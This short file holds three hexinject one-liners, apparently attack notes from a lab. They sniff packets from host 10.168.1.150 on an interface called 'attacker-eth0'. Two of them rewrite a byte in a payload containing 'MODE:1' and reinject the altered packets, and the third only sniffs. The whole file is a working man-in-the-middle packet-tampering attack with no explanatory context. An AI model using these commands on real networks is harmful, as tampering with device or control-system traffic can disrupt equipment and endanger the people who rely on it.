hexinject -s -i attacker-eth0 -f 'src host 10.168.1.150' | replace '52 02 20 06 24 01 05 9D 10 00 4D 04 91 06 4D 4F 44 45 3A 31 C3 00 01 00 01 00 01 00 01 00' '52 02 20 06 24 01 05 9D 10 00 4D 04 91 06 4D 4F 44 45 3A 31 C3 00 01 00 04 00 01 00 01 00' | hexinject -p -i attacker-eth0


#hexinject -s -i attacker-eth0 -f 'src host 10.168.1.150' | replace '3A 31 C3 00 01 00 01' '3A 31 C3 00 01 00 04' | hexinject -p -i attacker-eth0 


#hexinject -s -i attacker-eth0 -f 'src host 10.168.1.150' 
